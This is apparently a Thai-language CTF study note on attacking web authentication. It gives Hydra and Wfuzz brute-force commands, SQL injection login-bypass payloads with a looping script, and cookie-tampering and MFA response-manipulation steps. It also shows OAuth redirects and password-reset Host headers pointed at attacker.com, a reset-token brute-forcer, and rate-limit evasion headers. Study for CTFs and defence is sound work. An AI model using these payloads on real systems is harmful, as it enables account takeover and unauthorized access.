#web

# ❓ What
- Authentication คือกระบวนการตรวจสอบตัวตนของผู้ใช้งาน (identity verification)
- ช่องโหว่ authentication เป็นจุดอ่อนที่พบบ่อยใน CTF และ penetration testing
- ใช้ bypass การยืนยันตัวตนเพื่อเข้าถึงระบบโดยไม่มีสิทธิ์
- เทคนิคต่าง ๆ ตั้งแต่ brute force, session hijacking, ไปจนถึง OAuth exploitation

# 🔍 Landmark (Detection)
- Login forms, API endpoints ที่ต้องการ authentication
- Session cookies หรือ JWT tokens ใน HTTP headers
- OAuth/SAML flows ในระบบ SSO (Single Sign-On)
- Multi-factor authentication (MFA) mechanisms
- Password reset functionality
- "Remember me" features
- Rate limiting หรือ account lockout mechanisms

> [!TIP] CTF Quick Detection
> ใช้ [[Burp Suite]] ดู HTTP requests เพื่อหา authentication parameters, cookies, หรือ tokens ที่สามารถ manipulate ได้

# 🟦 Types/Categories

## 1. Brute Force Attacks
การทดลอง username/password หลาย ๆ ครั้งจนกว่าจะเจอค่าที่ถูกต้อง

## 2. Session Attacks
การโจมตีผ่าน session management เช่น session fixation, session hijacking

## 3. Multi-Factor Bypass
การหลบ 2FA/MFA protection mechanisms

## 4. OAuth/SAML Vulnerabilities
ช่องโหว่ในการ implement federated authentication

## 5. Password Reset Exploitation
การใช้ช่องโหว่ในกระบวนการ reset password

## 6. Anonymous/Default Credentials
การเข้าถึงด้วย credentials ที่ไม่ต้องมีการตรวจสอบหรือ default passwords

# 🔨 Exploitation

## Brute Force

### Word List
rockyou.txt - wordlist ยอดนิยมสำหรับ password cracking
Location: `/usr/share/wordlists/rockyou.txt`

### Using Hydra
```bash
# Brute force HTTP POST login form
# -l <username> กำหนด username
# -P <wordlist> ระบุ password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target_url> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

### Using Wfuzz
```bash
# Fuzz password parameter ด้วย wordlist
# -z file,<wordlist> ระบุไฟล์ wordlist
# -d POST data โดยใช้ FUZZ เป็น placeholder
# --hh 0 ซ่อน response ที่มี content length = 0
wfuzz -z file,/usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ&login_user=" --hh 0 <target_url>/login_db.php
```

> [!WARNING] Rate Limiting
> ระวัง rate limiting และ account lockout mechanisms - อาจต้องใช้ delay หรือ rotating proxies

### Using Burp Suite Intruder
```bash
# 1. Capture login request ใน Burp Proxy
# 2. Send to Intruder (Ctrl+I)
# 3. Mark password field เป็น payload position
# 4. Load wordlist และ Start attack
# 5. Sort by response length/status เพื่อหา valid credentials
```

Tool: [[Burp Suite]] เพื่อ capture และ manipulate login requests
Tool: [[Hydra]] สำหรับ automated brute forcing

## SQL Injection Authentication Bypass

### Basic Payloads
```sql
-- Classic OR bypass
‘ OR ‘1’=’1
‘ OR ‘1’=’1’ --
‘ OR ‘1’=’1’ #

-- Comment out password check
admin’ --
admin’ #

-- Always true conditions
‘ OR 1=1 --
admin’ OR ‘x’=’x
```

### Advanced Bypass
```python
#!/usr/bin/env python3
# SQL injection authentication bypass script
import requests

target_url = "<target_url>/login.php"
# Payloads สำหรับ bypass authentication
payloads = [
    "’ OR ‘1’=’1",
    "’ OR ‘1’=’1’ --",
    "admin’ --",
    "admin’ #",
    "’ OR 1=1 --",
    "’) OR (‘1’=’1",
    "’ OR ‘x’=’x",
]

for payload in payloads:
    data = {
        "username": payload,
        "password": "anything"
    }
    response = requests.post(target_url, data=data)
    
    # ตรวจสอบว่า login สำเร็จหรือไม่
    if "Welcome" in response.text or response.status_code == 302:
        print(f"[+] Success with payload: {payload}")
        break
    else:
        print(f"[-] Failed: {payload}")
```

Related: [[SQL Injection]] สำหรับเทคนิคเพิ่มเติม

## Session Management Exploitation

### Session Fixation
```bash
# 1. ขอ session ID จาก application
curl -i <target_url>/login.php

# 2. ส่ง session ID ที่รู้ให้เหยื่อ (เช่นผ่าน phishing)
# 3. เมื่อเหยื่อ login ด้วย session ID นั้น, attacker สามารถใช้ session เดียวกันได้
```

### Session Hijacking with Burp Suite
```
Step 1: Login ด้วย account ปกติ
Step 2: Capture request ใน [[Burp Suite]] Proxy
Step 3: แก้ไข session cookie หรือ user parameter
   เช่น: Cookie: user=daftpunk → Cookie: user=admin
Step 4: Forward request และเข้าถึงได้ในฐานะ admin
```

> [!TIP] Cookie Tampering
> ลองแก้ไข cookie values เช่น `role=user` → `role=admin`, `isAdmin=0` → `isAdmin=1`

## Multi-Factor Authentication Bypass

### Direct Request to Protected Resource
```bash
# บาง application ไม่ enforce MFA สำหรับทุก endpoint
# ลอง request ตรง ๆ ไปยัง protected page หลัง login
curl -H "Cookie: session=<session_token>" <target_url>/dashboard.php
```

### Response Manipulation
```bash
# Intercept MFA verification response ใน [[Burp Suite]]
# แก้ response จาก {"mfa_required": true} เป็น {"mfa_required": false}
# หรือจาก {"status": "failed"} เป็น {"status": "success"}
```

### Backup Codes Exploitation
```bash
# บาง MFA systems มี backup codes ที่ weak
# ลอง brute force backup codes (มักเป็น 6-8 หลัก)
# หรือหา backup codes ที่ leak ใน API responses
```

## OAuth 2.0 Vulnerabilities

### Redirect URI Manipulation
```bash
# Authorization request พร้อม malicious redirect_uri
GET /oauth/authorize?
    client_id=<client_id>&
    redirect_uri=https://attacker.com/callback&
    response_type=code&
    scope=read
```

### CSRF in OAuth Flow
```html
<!-- CSRF attack เพื่อ link victim’s account กับ attacker’s OAuth account -->
<img src="https://<target_url>/oauth/connect?code=<attacker_code>&state=<state>">
```

## Password Reset Exploitation

### Host Header Injection
```bash
# Inject malicious host header เพื่อ redirect reset link
POST /password-reset HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

### Token Leakage
```bash
# ตรวจสอบว่า reset token รั่วไหลใน:
# - Referer header
# - Browser history  
# - Server logs
# - Email tracking pixels
```

### Predictable Tokens
```python
#!/usr/bin/env python3
# Brute force predictable password reset tokens
import requests
import string

target = "<target_url>/reset-password"
# ถ้า token เป็น 6 หลัก numeric
for i in range(100000, 999999):
    token = str(i)
    response = requests.post(target, data={"token": token, "password": "newpass123"})
    if response.status_code == 200:
        print(f"[+] Valid token found: {token}")
        break
```

# 🚪 Bypass Techniques

## Account Registration Bypass
```bash
# สร้าง account ใหม่ที่ชื่อเหมือน existing user เพื่อทับข้อมูลเดิม
# Example: ถ้ามี user "admin" อยู่แล้ว
# ลอง register "admin " (มี space), "Admin", "ADMIN", "admin@"
```

## Rate Limit Bypass
```bash
# เพิ่ม headers เพื่อหลบ rate limiting
X-Forwarded-For: <random_ip>
X-Real-IP: <random_ip>
X-Originating-IP: <random_ip>

# หรือใช้ rotating IP addresses
```

## CAPTCHA Bypass
```bash
# ตรวจสอบว่า CAPTCHA validation เกิดใน client-side only
# ลอง submit form โดยตรงโดยไม่ผ่าน CAPTCHA
# หรือ reuse CAPTCHA token หลาย ๆ ครั้ง
```

# Anonymous Login

## Samba Anonymous Access
```bash
# List shares โดยไม่ต้อง authenticate
smbclient -L <target_ip>

# เชื่อมต่อ public share
smbclient \\\\<target_ip>\\public

# Download file
smb: \> get flag.txt
```

## FTP Anonymous Login
```bash
# Login ด้วย username: anonymous, password: anonymous
ftp <target_ip>

# เปิด passive mode สำหรับ firewall bypass
ftp> passive on

# Download file
ftp> get flag.txt
```

# 🛠️ Tool
- [[Hydra]] : Brute force tool สำหรับ multiple protocols (HTTP, FTP, SSH, etc.)
- [[Burp Suite]] : Web proxy สำหรับ intercept และ modify authentication requests
- [[SQLMap]] : Automated SQL injection รวมถึง authentication bypass
- [[John The Ripper]] : Password cracking tool
- [[Hashcat]] : GPU-accelerated password cracking

# 💡 Related
- [[SQL Injection]] : Authentication bypass ผ่าน SQL injection
- [[🌐 Web application]] : หมวดหมู่หลักของ web exploitation
- [[Session Management]] : การจัดการ session หลัง authentication
- [[JWT Vulnerabilities]] : JSON Web Token security issues
- [[CSRF]] : Cross-Site Request Forgery attacks

# 📚 Example

## Example 1: CTF Challenge - Weak Session Management

**Scenario:** Web application ใช้ predictable session IDs

```bash
# Step 1: Login และดู session cookie
curl -i -X POST -d "username=testuser&password=testpass" <target_url>/login.php

# Response มี: Set-Cookie: PHPSESSID=user_1001

# Step 2: สังเกตว่า session ID เป็นแบบ sequential
# ลอง enumerate session IDs
for i in {1..100}; do
    curl -H "Cookie: PHPSESSID=admin_$i" <target_url>/dashboard.php
done

# Step 3: เมื่อเจอ valid admin session, เข้าถึง flag
curl -H "Cookie: PHPSESSID=admin_1" <target_url>/flag.php
```

## Example 2: PicoCTF - OAuth Misconfiguration

**Scenario:** OAuth implementation ไม่ตรวจสอบ state parameter

```bash
# Step 1: สังเกต OAuth flow
# Authorization URL: /oauth/authorize?client_id=xxx&redirect_uri=xxx&state=xxx

# Step 2: ลบ state parameter
# GET /oauth/authorize?client_id=xxx&redirect_uri=xxx

# Step 3: System ไม่ validate state → CSRF vulnerability
# สามารถ link victim account เข้ากับ attacker’s OAuth
```

> [!EXAMPLE] Real CTF Walkthrough
> **Challenge:** HackTheBox - Delivery
> 1. พบ MatterMost และ osTicket instances
> 2. สร้าง ticket ใน osTicket → ได้ email: ticket_id@delivery.htb
> 3. ใช้ email นี้ register MatterMost account
> 4. Verify email ผ่าน ticket system
> 5. เข้าถึง internal MatterMost → เจอ credentials
> 6. ใช้ credentials SSH เข้า server